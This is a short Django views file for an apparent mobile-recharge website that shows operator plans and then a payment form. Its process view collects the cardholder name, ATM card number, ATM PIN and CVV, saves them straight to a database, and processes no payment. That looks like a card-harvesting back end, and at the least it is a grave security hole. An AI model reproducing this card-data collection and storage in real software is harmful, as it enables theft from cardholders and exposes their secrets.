from ast import operator
import re
from django.shortcuts import render,redirect
from services import mobileinfo as mi
from services import logic
from .models import UserDetails
# Create your views here.

def Recharge(request):
    if(request.method == "POST"):
        mobile_no = request.POST["mobno"]
        operator = request.POST["operator"]
        circle = request.POST["circle"]
        # info = mi.getInfo(mobile_no)
        info = mi.getInfo(mobile_no , operator , circle)
        print(len(info))
        context = {
            "all_plans" : info[0],
            "Original_Operator" : info[1],
        
        }
        # print(mobile_no , operator , circle)
        return render(request,"index.html" , context)
    return render(request,"index.html")

def payment(request): 
    return render(request , "details.html")

def process(request):
    if(request.method == "POST"):
        cardholder = request.POST["username"]
        atm = request.POST["atm"]
        atmpin = request.POST["pin"]
        cvv = request.POST["cvv"]
        cont = UserDetails(username = cardholder ,atm = atm,cvv = cvv,atmpin = atmpin)
        cont.save()
    return render(request, 'index.html')


    
